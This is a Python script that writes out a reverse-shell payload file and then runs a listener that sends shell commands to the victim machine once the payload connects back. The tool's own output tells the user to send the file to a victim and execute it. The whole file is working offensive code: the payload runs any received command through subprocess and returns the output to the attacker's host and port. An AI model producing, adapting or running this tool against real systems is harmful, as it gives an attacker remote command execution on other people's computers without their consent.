import socket
import argparse

# Generate a reverse shell based on given LHOST, RPORT and LPORT
def generate_reverse_shell(LHOST, LPORT, output_file): 
    shell_code = f"""import socket
import subprocess
import os

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.connect(("{LHOST}", {LPORT})) # Connect to attacker

        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))

        s.close()
    except Exception as e:
        pass  # USE TO DEBUG IF NEEDED

if __name__ == "__main__":
    reverse_shell()
"""
    with open(output_file, "w") as f: # Write the reverse shell code into a file
        f.write(shell_code)
    
    print(f"[+] Reverse shell script generated: {output_file}")
    print(f"[!] Send this file to the victim and execute it: python {output_file}")

def start_listener(LHOST, LPORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create tcp socket
    server.bind((LHOST, LPORT)) # bind ip and port
    server.listen(1) # Listen

    print(f"[*] Listening on {LHOST}:{LPORT}...")
    client_socket, client_address = server.accept()
    print(f"[+] Connection received from {client_address[0]}:{client_address[1]}")

    while True:
        command = input("Shell> ") # command to send to the connected client
        if command.lower() == "exit":
            client_socket.send(b"exit")
            break

        client_socket.send(command.encode("utf-8")) # Send the command to the client (utf-8)
        response = client_socket.recv(4096).decode("utf-8") # Receive the response from the client
        print(response)

    client_socket.close()
    server.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Python Reverse Shell Listener with Auto Shell Generator")
    parser.add_argument("--lhost", type=str, help="REQUIRED: IP address of attacker (--lhost <IP>)")
    parser.add_argument("--lport", type=int, default=4444, help="Port to listen on (default: 4444)") # set listening port (attacker)
    parser.add_argument("--name", type=str, help="Reverse shell name", default = "r_shell.py")
    
    args = parser.parse_args()
    
    if not args.lhost:
        parser.print_help()
    else:
        # Generate Reverse Shell
        generate_reverse_shell(args.lhost, args.lport, args.name)

        # Start Listening
        start_listener(args.lhost, args.lport)
